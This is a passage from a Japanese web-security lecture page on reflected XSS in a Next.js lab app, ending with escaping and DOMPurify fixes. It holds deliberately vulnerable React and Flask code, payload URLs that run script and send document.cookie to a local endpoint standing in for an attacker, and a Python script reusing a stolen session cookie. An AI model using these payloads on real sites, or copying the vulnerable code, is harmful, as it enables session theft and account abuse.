<span id="cb32-141"><a href="#cb32-141"></a>  <span class="op">&lt;</span>div className<span class="op">=</span><span class="st">&quot;mt-4 ml-4 flex text-sm text-slate-600&quot;</span><span class="op">&gt;</span></span>
<span id="cb32-142"><a href="#cb32-142"></a>    {<span class="co">/* サニタイズされていない値を dangerouslySetInnerHTML で出力（💀超危険） */</span>}</span>
<span id="cb32-143"><a href="#cb32-143"></a>    <span class="op">&lt;</span>span dangerouslySetInnerHTML<span class="op">=</span>{{ __html<span class="op">:</span> name }} className<span class="op">=</span><span class="st">&quot;mr-1&quot;</span> <span class="op">/&gt;</span></span>
<span id="cb32-144"><a href="#cb32-144"></a>    さん、こんにちは！</span>
<span id="cb32-145"><a href="#cb32-145"></a>  <span class="op">&lt;/</span>div<span class="op">&gt;</span></span>
<span id="cb32-146"><a href="#cb32-146"></a>)}</span></code></pre></div>
      <p>XSS脆弱性の原因となっているのは <strong>第40行目</strong> と <strong>第143行目</strong>
      になります。いずれか一方で適切な処理がされていれば XSS
      を防ぐことはできます。例えば、<strong>第143行目</strong> を
      <code>&lt;span className="mr-1"&gt;{name}&lt;/span&gt;</code>
      とするだけでXSS攻撃は失敗します。</p>
      <p>なお、反射型XSSは「詳細は<a
      href="http://localhost:3000/news?name=%3Cimg%20src=x%20onerror=%22alert(&#39;Hoge!&#39;)%22%3E">こちら</a>をご覧ください」のようなリンクに仕込まれる可能性があります。</p>
      <p>このような状態で、どのようなXSS攻撃を受ける可能性があるかを見ていきます。</p>
      <h3 data-number="7.2.1" id="例1-無害"><span class="header-section-number">7.2.1</span> 例1
      (無害)</h3>
      <div class="sourceCode" id="cb33" data-caption="無害なクエリパラメータ"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=寝屋川タヌキ</span></code></pre></div>
      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
      <figure>
      <img src="figs/01/xss-01.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>ここでは、クエリパラメータが単なるテキスト (<code>寝屋川タヌキ</code>)
      だったので、特に問題になることはおきません。</p>
      <h3 data-number="7.2.2" id="例2"><span class="header-section-number">7.2.2</span> 例2</h3>
      <div class="sourceCode" id="cb34" data-caption="無害なクエリパラメータ？🤔"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;font size=20 color=&quot;brown&quot;&gt;&lt;b&gt;寝屋川タヌキ&lt;/b&gt;&lt;/font&gt;</span></code></pre></div>
      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
      <figure>
      <img src="figs/01/xss-02.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>ここでは、クエリパラメータに <span class="masked">HTMLタグ</span>
      が含まれています。その結果、そのHTMLタグが反映された出力となっています。</p>
      <h3 data-number="7.2.3" id="例3"><span class="header-section-number">7.2.3</span> 例3 💀</h3>
      <div class="sourceCode" id="cb35" data-caption="💀 XSS脆弱性を利用してJavaScriptを実行"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;alert(&#39;Hoge!&#39;)&quot;&gt;</span></code></pre></div>
      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
      <figure>
      <img src="figs/01/xss-03.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p><code>&lt;img src=x onerror="alert('Hoge!')"&gt;</code> は、XSS攻撃でよく使われる HTML
      タグです。</p>
      <ol type="1">
      <li><code>&lt;img src="x"&gt;</code> によって、存在しない画像を読み込もうとする。</li>
      <li>読み込み失敗 → <code>onerror</code> が実行される。</li>
      <li>結果として <code>alert('Hoge!')</code> という JavaScript
      が実行され、画面に「Hoge!」というアラートが表示される。</li>
      </ol>
      <p>アラートが実行されたところで実害はありませんが、任意の JavaScript
      が実行できてしまうことが非常に深刻な問題です。</p>
      <h3 data-number="7.2.4" id="例4"><span class="header-section-number">7.2.4</span> 例4
      💀💀</h3>
      <div class="sourceCode" id="cb36"
      data-caption="💀💀 XSS脆弱性を利用してCookieを取得して表示"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;document.write(&#39;(ToT) =&gt; &#39;,document.cookie)&quot;&gt;</span></code></pre></div>
      <p>上記のURLをブラウザのアドレバーにコピペすると次のようになります。</p>
      <figure>
      <img src="figs/01/xss-04.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>クエリパラメータに設定されているのは「<strong>HttpOnly属性が設定されていない Cookie
      を</strong> <code>document.cookie</code>
      <strong>によって読み出して画面に出力するJavaScript</strong>」のコードです。危険な香りがしてきましたが、自分の
      Cookie が、自分の見ているが画面に出力されるだけで、特に実害はありません。</p>
      <h3 data-number="7.2.5" id="例5"><span class="header-section-number">7.2.5</span> 例5
      💀💀💀</h3>
      <p>次のクエリパラメータには <code>document.cookie</code> で取得した Cookie を
      <code>http://localhost:3000/api/xss</code> に送信して、その後、<code>/</code> に移動するような
      JavaScript プログラムが設定されています。</p>
      <div class="sourceCode" id="cb37"
      data-caption="💀💀💀 XSS脆弱性を利用してCookieを取得して送信"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;fetch(&#39;http://localhost:3000/api/xss?c=&#39;+document.cookie);window.location.href=&#39;/&#39;&quot;&gt;</span></code></pre></div>
      <p>上記は、そのまま貼り付けても機能しません。<code>name=</code>
      以降の文字をURLエンコーディングする必要があります。</p>
      <p>以下のサイトなどを利用して
      <code>&lt;img src=x onerror="fetch('http://localhost:3000/api/xss?c='+document.cookie);window.location.href='/'"&gt;</code>
      の部分だけURLエンコーディングします。</p>
      <ul>
      <li><a
      href="https://tech-unlimited.com/urlencode.html">URLエンコーディング/パーセントエンコーディング</a></li>
      </ul>
      <p>以下のような URL が得られます。</p>
      <div class="sourceCode" id="cb38"
      data-caption="💀💀💀 XSS脆弱性を利用してCookieを取得して送信 (URLエンコード後)"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=%3Cimg+src%3Dx+onerror%3D%22fetch%28%27http%3A%2F%2Flocalhost%3A3000%2Fapi%2Fxss%3Fc%3D%27%2Bdocument.cookie%29%3Bwindow.location.href%3D%27%2F%27%22%3E</span></code></pre></div>
      <p>これを貼り付けて実行すると、自分の Cookie が <code>http://localhost:3000/api/xss</code>
      宛に送信されます😇。ここでは実験のために、自分のウェブアプリのウェブAPIに情報を送っていますが、実際の攻撃時には、攻撃者😈の用意した
      URL となります。</p>
      <p>プロジェクトフォルダのなかの <code>src/app/api/xss/route.ts</code>
      を読解してもらうと分かるとおもいますが、<code>http://localhost:3000/api/xss?c=HogeFugaPiyo</code>
      のようにクエリパラメータをつけてアクセスすると、<code>c=</code> の部分、つまり
      <code>HogeFugaPiyo</code> を DB の <code>stolenContent</code>
      に保存する仕組みになっています。</p>
      <p>実際に被害を確認してみましょう。次のコマンドで DB の内容を確認します。</p>
      <pre><code>npx prisma studio</code></pre>
      <p>次のように、見事に自分の Cookie が攻撃者の DB の <code>tolenContent</code>
      テーブルに記録されてしまいました😇</p>
      <figure>
      <img src="figs/01/xss-05.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>ここで <code>cart_session_id</code> が窃取されたことは極めて問題です。窃取した
      <code>cart_session_id</code> を Cookie
      にセットすれば、攻撃者が自由にカートの内容を操作できるためです。</p>
      <p>以下は、Python プログラムですが窃取した Cookie を使ってカートに商品IDが <code>A-002</code>
      のアイテム (＝月収7桁を叩き出すCSS講座【完全無料】) を 9999 個突っ込むものになっています。</p>
      <div class="sourceCode" id="cb40" data-caption="💀💀💀💀 入手したCookieを悪用 (Python)"><pre
      class="sourceCode python"><code class="sourceCode python"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> json</span>
<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&#39;http://localhost:3000/api/cart&#39;</span></span>
<span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-6"><a href="#cb40-6" aria-hidden="true" tabindex="-1"></a><span class="co"># ここに窃取したセッションIDをセット</span></span>
<span id="cb40-7"><a href="#cb40-7" aria-hidden="true" tabindex="-1"></a>cart_session_id <span class="op">=</span> <span class="st">&#39;00000000-0000-0000-0000-000000000000&#39;</span></span>
<span id="cb40-8"><a href="#cb40-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-9"><a href="#cb40-9" aria-hidden="true" tabindex="-1"></a>cookies <span class="op">=</span> {<span class="st">&#39;cart_session_id&#39;</span>: cart_session_id}</span>
<span id="cb40-10"><a href="#cb40-10" aria-hidden="true" tabindex="-1"></a>headers <span class="op">=</span> {<span class="st">&#39;Content-Type&#39;</span>: <span class="st">&#39;application/json&#39;</span>}</span>
<span id="cb40-11"><a href="#cb40-11" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> {<span class="st">&#39;productId&#39;</span>: <span class="st">&#39;A-002&#39;</span>, <span class="st">&#39;quantity&#39;</span>: <span class="dv">9999</span>}</span>
<span id="cb40-12"><a href="#cb40-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-13"><a href="#cb40-13" aria-hidden="true" tabindex="-1"></a>res <span class="op">=</span> requests.patch(</span>
<span id="cb40-14"><a href="#cb40-14" aria-hidden="true" tabindex="-1"></a>  url<span class="op">=</span>url,</span>
<span id="cb40-15"><a href="#cb40-15" aria-hidden="true" tabindex="-1"></a>  data<span class="op">=</span>json.dumps(payload),</span>
<span id="cb40-16"><a href="#cb40-16" aria-hidden="true" tabindex="-1"></a>  headers<span class="op">=</span>headers,</span>
<span id="cb40-17"><a href="#cb40-17" aria-hidden="true" tabindex="-1"></a>  cookies<span class="op">=</span>cookies</span>
<span id="cb40-18"><a href="#cb40-18" aria-hidden="true" tabindex="-1"></a>)</span>
<span id="cb40-19"><a href="#cb40-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-20"><a href="#cb40-20" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;ステータスコード: </span><span class="sc">{</span>res<span class="sc">.</span>status_code<span class="sc">}</span><span class="ss">&#39;</span>)</span>
<span id="cb40-21"><a href="#cb40-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-22"><a href="#cb40-22" aria-hidden="true" tabindex="-1"></a>is_success <span class="op">=</span> res.json().get(<span class="st">&#39;success&#39;</span>)</span>
<span id="cb40-23"><a href="#cb40-23" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;res.success: </span><span class="sc">{</span>is_success<span class="sc">}</span><span class="ss">&#39;</span>)</span>
<span id="cb40-24"><a href="#cb40-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-25"><a href="#cb40-25" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> is_success:</span>
<span id="cb40-26"><a href="#cb40-26" aria-hidden="true" tabindex="-1"></a>  res <span class="op">=</span> requests.get(</span>
<span id="cb40-27"><a href="#cb40-27" aria-hidden="true" tabindex="-1"></a>    url<span class="op">=</span>url,</span>
<span id="cb40-28"><a href="#cb40-28" aria-hidden="true" tabindex="-1"></a>    cookies<span class="op">=</span>cookies</span>
<span id="cb40-29"><a href="#cb40-29" aria-hidden="true" tabindex="-1"></a>  )</span>
<span id="cb40-30"><a href="#cb40-30" aria-hidden="true" tabindex="-1"></a>  cart_items <span class="op">=</span> res.json().get(<span class="st">&#39;payload&#39;</span>)</span>
<span id="cb40-31"><a href="#cb40-31" aria-hidden="true" tabindex="-1"></a>  <span class="bu">print</span>(<span class="ss">f&#39;カートの内容: </span><span class="sc">{</span>json<span class="sc">.</span>dumps(cart_items, indent<span class="op">=</span><span class="dv">2</span>)<span class="sc">}</span><span class="ss">&#39;</span>)</span></code></pre></div>
      <p>以上で、Cookie
      に適切な属性を設定することの重要性、適切なサニタイズやエスケープ処理をすることの重要性が理解できたと思います。</p>
      <p>Cookie
      に「HttpOnly属性」をつけていれば…もしくはサニタイズもしくはエスケープ処理をしていれば…防ぐことができた被害でした。</p>
      <h2 data-number="7.3" id="エスケープ処理の方法"><span class="header-section-number">7.3</span>
      エスケープ処理の方法</h2>
      <p><strong>エスケープ処理</strong>とは <code>&lt;</code> や <code>&gt;</code> などの
      <strong>HTMLとして解釈される可能性がある文字</strong> を <code>&amp;lt;</code> や
      <code>&amp;gt;</code> などに置き換える処理を指します。ここで <code>&amp;lt;</code> や
      <code>&amp;gt;</code> は <span class="masked">文字実体参照</span>
      とばれるもので、ウェブブラウザでは、これを「HTML」ではなく「文字」としての <code>&lt;</code>
      や <code>&gt;</code> として表示 (レンダリング) します。</p>
      <p>例えば…</p>
      <ul>
      <li><code>&lt;img src=x onerror="alert('Hoge!')"&gt;</code></li>
      </ul>
      <p>…に対して<strong>エスケープ処理</strong>をかけると…</p>
      <ul>
      <li><code>&amp;lt;img src=x onerror=&amp;quot;alert(&amp;#39;Hoge!&amp;#39;)&amp;quot;&amp;gt;</code></li>
      </ul>
      <p>…となります。ここで、<code>"</code> は <code>&amp;quot;</code> に、<code>'</code> は
      <code>&amp;#39;</code> に変換されています。</p>
      <p>Next.js (React) では、安全のために <strong>エスケープ処理がデフォルト適用</strong>
      される仕様となっているため、以下のように書き換えれば <code>src/app/news/page.tsx</code>
      は安全なコードとなります (<code>dangerouslySetInnerHTML</code>
      だけが、例外的にエスケープ処理が適用されません)。</p>
      <div class="sourceCode" id="cb41"
      data-caption="src/app/news/page.tsx (抜粋) Before 💀 XSS脆弱性あり" data-startFrom="143"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 142;"><span id="cb41-143"><a href="#cb41-143"></a><span class="op">&lt;</span>span dangerouslySetInnerHTML<span class="op">=</span>{{ __html<span class="op">:</span> name }} className<span class="op">=</span><span class="st">&quot;mr-1&quot;</span> <span class="op">/&gt;</span></span></code></pre></div>
      <div class="sourceCode" id="cb42"
      data-caption="src/app/news/page.tsx (抜粋) After 😁 エスケープ処理" data-startFrom="143"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 142;"><span id="cb42-143"><a href="#cb42-143"></a><span class="op">&lt;</span>span className<span class="op">=</span><span class="st">&quot;mr-1&quot;</span><span class="op">&gt;</span>{name}<span class="op">&lt;/</span>span<span class="op">&gt;</span></span></code></pre></div>
      <p>エスケープ処理がされたときは、次のように画面がレンダリングされます。</p>
      <figure>
      <img src="figs/01/xss-06.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <h2 data-number="7.4" id="サニタイズ-無害化-の方法"><span
      class="header-section-number">7.4</span> サニタイズ (無害化) の方法</h2>
      <p>エスケープ処理を適用すると全ての HTMLタグ や JavaScript
      が無効化されますが、<strong>一部の安全なタグ</strong>
      (<code>&lt;br /&gt;</code>、<code>&lt;font&gt;</code>) や、属性
      (<code>size=</code>、<code>color=</code>) だけは <strong>有効化したい場合</strong>
      もあります。たとえば、ブログ投稿機能をもったウェブアプリなどでは簡単な装飾などを許可したい場合があります。</p>
      <p>この場合は、<code>isomorphic-dompurify</code>
      というサニタイズライブラリが便利です。<code>isomorphic-dompurify</code> は、Next.js
      のクライアントコンポーネント (<code>use client</code>)
      で動作するもので、以下のように使用します。</p>
      <div class="sourceCode" id="cb43" data-caption="src/app/news/page.tsx (抜粋) Before 💀"
      data-startFrom="39"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 38;"><span id="cb43-39"><a href="#cb43-39"></a><span class="kw">const</span> params <span class="op">=</span> <span class="kw">new</span> <span class="fu">URLSearchParams</span>(<span class="bu">window</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">search</span>)<span class="op">;</span></span>
<span id="cb43-40"><a href="#cb43-40"></a><span class="fu">setName</span>(params<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;name&quot;</span>))<span class="op">;</span> <span class="co">// 💀 サニタイズ（無害化）ぜずに値を格納</span></span></code></pre></div>
      <div class="sourceCode" id="cb44"
      data-caption="src/app/news/page.tsx (抜粋) After 😁 サニタイズ処理" data-startFrom="39"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 38;"><span id="cb44-39"><a href="#cb44-39"></a><span class="kw">const</span> name <span class="op">=</span> params<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;name&quot;</span>)<span class="op">;</span></span>
<span id="cb44-40"><a href="#cb44-40"></a><span class="cf">if</span> (<span class="op">!</span>name) { <span class="co">// name が null のとき</span></span>
<span id="cb44-41"><a href="#cb44-41"></a>  <span class="fu">setName</span>(name)<span class="op">;</span></span>
<span id="cb44-42"><a href="#cb44-42"></a>  <span class="cf">return</span><span class="op">;</span></span>
<span id="cb44-43"><a href="#cb44-43"></a>}</span>
<span id="cb44-44"><a href="#cb44-44"></a><span class="co">// 注意：tsx の冒頭で import DOMPurify from &quot;isomorphic-dompurify&quot; が必要</span></span>
<span id="cb44-45"><a href="#cb44-45"></a><span class="kw">const</span> sanitizedName <span class="op">=</span> DOMPurify<span class="op">.</span><span class="fu">sanitize</span>(name<span class="op">,</span> { <span class="co">// サニタイズ処理</span></span>
<span id="cb44-46"><a href="#cb44-46"></a>  ALLOWED_TAGS<span class="op">:</span> [<span class="st">&quot;b&quot;</span><span class="op">,</span> <span class="st">&quot;i&quot;</span><span class="op">,</span> <span class="st">&quot;font&quot;</span>]<span class="op">,</span> <span class="co">// 許可するタグ</span></span>
<span id="cb44-47"><a href="#cb44-47"></a>  ALLOWED_ATTR<span class="op">:</span> [<span class="st">&quot;color&quot;</span>]<span class="op">,</span> <span class="co">// 許可する属性</span></span>
<span id="cb44-48"><a href="#cb44-48"></a>})<span class="op">;</span></span>
<span id="cb44-49"><a href="#cb44-49"></a><span class="fu">setName</span>(sanitizedName)<span class="op">;</span> <span class="co">// 😁 サニタイズして値を格納</span></span></code></pre></div>
      <p>上記のようにすると、太字タグ <code>&lt;b&gt;&lt;/b&gt;</code>、斜体タグ
      <code>&lt;i&gt;&lt;/i&gt;</code>、フォントタグ <code>&lt;font&gt;&lt;/font&gt;</code>
      のみを許可し、さらにタグの属性のうち <code>color=</code>
      のみを許可するようなサニタイズ処理がされます。<strong>許可されていない該当しないタグや属性は削除
      (≠無害化) されます</strong>。そのうえで <code>dangerouslySetInnerHTML</code> を使用して
      <code>name</code> を出力してください。</p>
      <p>以上のようなサニタイズ処理を適当したとき、次のようなURLでアクセスすると…</p>
      <pre><code>http://localhost:3000/news?name=&lt;font color=&quot;blue&quot; size=&quot;100&quot;&gt;&lt;b&gt;萱島ウサギ&lt;/b&gt;&lt;/font&gt;</code></pre>
      <p>次のように出力されます
      (<code>size=</code>の属性は適用されていないことに着目してください)。</p>
      <figure>
      <img src="figs/01/xss-07.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <h3 data-number="7.4.1" id="演習-5"><span class="header-section-number">7.4.1</span> 演習</h3>
      <p>サニタイズ処理を適用してください。</p>
      <h2 data-number="7.5" id="flask-python-などでもxss脆弱性に注意"><span
      class="header-section-number">7.5</span> Flask (Python) などでもXSS脆弱性に注意</h2>
      <p>Next.js は、基本的にはXSS攻撃が成功しにくい設計になっています。あえて
      <code>dangerouslySetInnerHTML</code> 属性をしなければ問題ありません。</p>
      <p>一方で、Flask (前期実験のもう一方のテーマで使用)
      などは、標準でXSS攻撃が成功しやすい設計になっています。十分に注意してください。</p>
      <div class="sourceCode" id="cb46" data-caption="XSS脆弱性 (Python)"><pre
      class="sourceCode numberSource python numberLines"><code class="sourceCode python"><span id="cb46-1"><a href="#cb46-1"></a><span class="im">from</span> flask <span class="im">import</span> Flask, request, Response</span>
<span id="cb46-2"><a href="#cb46-2"></a></span>
<span id="cb46-3"><a href="#cb46-3"></a>app <span class="op">=</span> Flask(<span class="va">__name__</span>)</span>
<span id="cb46-4"><a href="#cb46-4"></a></span>
<span id="cb46-5"><a href="#cb46-5"></a><span class="at">@app.route</span>(<span class="st">&quot;/&quot;</span>)</span>
<span id="cb46-6"><a href="#cb46-6"></a><span class="kw">def</span> greet():</span>
<span id="cb46-7"><a href="#cb46-7"></a>  name <span class="op">=</span> request.args.get(<span class="st">&quot;name&quot;</span>, <span class="st">&quot;&quot;</span>)</span>
<span id="cb46-8"><a href="#cb46-8"></a>  html <span class="op">=</span> <span class="ss">f&quot;こんにちは</span><span class="sc">{</span>name<span class="sc">}</span><span class="ss">さん&quot;</span></span>
<span id="cb46-9"><a href="#cb46-9"></a>  <span class="cf">return</span> Response(html, content_type<span class="op">=</span><span class="st">&quot;text/html&quot;</span>)</span>
<span id="cb46-10"><a href="#cb46-10"></a></span>
<span id="cb46-11"><a href="#cb46-11"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
<span id="cb46-12"><a href="#cb46-12"></a>  app.run(debug<span class="op">=</span><span class="va">True</span>)</span></code></pre></div>
      <!-- ---------------------------------------- -->
    </main>

    <footer class="markdown-body">
      <p><a href="https://takeshiwada1980.github.io/Eii2-2025/">講義資料のIndexに移動</a></p>
    </footer>

    <script>
      window.onload = function () {
        // ナビゲーション関連
        let openBtn = document.getElementsByClassName("openbtn")[0];
        let navPnl = document.getElementById("g-nav");
        openBtn.onclick = () => {
          openBtn.classList.toggle("active");
          navPnl.classList.toggle("panelactive");
        };

        let items = navPnl.getElementsByTagName("a");
        Array.from(items).forEach((item) => {
          item.onclick = () => {
            openBtn.classList.toggle("active");
            navPnl.classList.toggle("panelactive");
          };
        });

        // マスク処理
        let maskedSpans = document.getElementsByClassName("masked");
        Array.from(maskedSpans).forEach((span) => {
          span.onclick = () => {
            span.classList.toggle("open");
          };
        });

        // data-startfrom 属性の行番号カウンタのリセット
        document.querySelectorAll("div.sourceCode").forEach(function (div) {
          var startFrom = div.getAttribute("data-startfrom");
          if (startFrom != null) {
            div.style.counterReset = "pg-line " + (startFrom - 1);
          }
        });

        // 画像にリンクを付与
        // let images = document.querySelectorAll("figure img");
        // Array.from(images).forEach((img) => {
        //   img.onclick = () => {
        //     location.href = img.getAttribute("src");
        //   };
        // });
      };
    </script>
  </body>
</html>
